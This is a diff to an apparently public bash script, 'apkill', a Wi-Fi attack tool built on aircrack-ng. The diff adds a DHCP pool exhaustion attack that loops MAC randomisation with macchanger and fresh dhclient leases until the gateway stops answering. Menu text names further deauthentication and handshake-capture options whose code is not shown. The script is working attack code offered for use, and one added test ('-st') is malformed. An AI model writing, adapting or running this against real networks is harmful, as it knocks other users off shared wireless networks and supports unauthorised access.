@@ -1,14 +1,15 @@
 #!/bin/bash
 # https://github.com/deadport/apkill
 # Warning: this is noob scripting, tipps on how things can be done better are welcome, thanks.
-# Dependencies: net-tools, egrep, aircrack-ng
-#dependency check
+# Dependencies: net-tools, egrep, aircrack-ng, macchanger
+
+#dependency check 
 chan=0
 if [ ! -d '/etc/apt' ]
 	then
-		echo "WARNING:You appear to not be using a debianesque System! Please review the script to change the needed bits."
+		echo "WARNING:You appear to not be using a debianesque System! Please review the script to change the needed bits." && sleep 20
 fi
-echo "checking for dependencies.."
+echo "checking for dependencies.. please wait"
 if [ ! -f '/usr/bin/aircrack-ng' ]
 	then
 		echo "loading aircrack.."
@@ -24,8 +25,13 @@ if [ ! -f '/sbin/iwlist' ]
 		echo "loading net-tools.."
 		sudo apt install net-tools -y > /dev/null
 fi
+if [ ! -d '/etc/macchanger' ]
+	then
+		echo "loading macchanger.."
+		sudo apt install macchanger -y > /dev/null
+fi
 echo "dependency check done.." && clear
-#end of dependencie check
+#end of dependencie check 
 clear
 #artwork
 tput setaf 1
@@ -44,9 +50,11 @@ echo "								                                        "
 tput sgr0
 #artwork end
 #opt
-echo "Choose an attack option [single client(1) whole AP(2) find hidden(3) get handshakes(4)]:"
-read ask
-if [ $ask -gt 4 ] || [ $ask -lt 1 ]
+echo "     		 	Choose an attack option:							"
+echo "[single client(1) whole AP(2) find hidden(3) get handshakes(4)	]"
+echo "[DHCP pool flooding attack (5)					]"
+echo "Choose [1-5]:" && read ask
+if [ $ask -gt 5 ] || [ $ask -lt 1 ]
 	then
 		tput setaf 1
 		echo "This option does not exist!"
@@ -58,8 +66,11 @@ fi
 iwconfig
 echo "Interface name(e.g. wlan0):"
 read inter
-echo "Interface name in Monitor Mode?:"
-read monitor
+if [ $ask -st 5 ]
+	then
+		echo "Interface name in Monitor Mode?:"
+		read monitor
+fi
 clear
 #read interface end
 #main
@@ -157,4 +168,41 @@ if [ $ask -eq 4 ]
 				tput sgr0
 		fi
 		sudo airmon-ng stop $monitor > /dev/null
+fi
+if [ $ask -eq 5 ]
+	then 
+		pass=0
+		essid=0
+		online=1
+		echo "To successfully perform this attack you must be connected to the destination AP!"
+		echo "Your Hostname is:"
+		hostname
+		echo "..you should always be carefull.."
+		echo "	"
+		tput setaf 1
+		gate=$(/sbin/ip route | awk '/default/ { print $3 }')
+		#start dhcp pool flooding
+		while [ $online -eq 1 ]
+			do
+				echo "attack is running, this will take a while.."
+				sudo ifconfig $inter down && sleep 2
+				sudo ip addr flush dev $inter
+				sudo macchanger -a $inter
+				sudo ifconfig $inter up 
+				sleep 4
+				sudo dhclient $inter
+				sleep 2
+				#check online start 
+				ping $gate -c 1 > /dev/null
+				if [ $? -eq 1 ]
+					then
+						online=0
+				fi
+				#check online end
+		done
+		#end dhcp pool flooding
+		echo "	"
+		echo "The connection is interrupted!"
+		echo "You may be out of reach or DHCP pool has been successfully flooded" 
+		tput sgr0
 fi
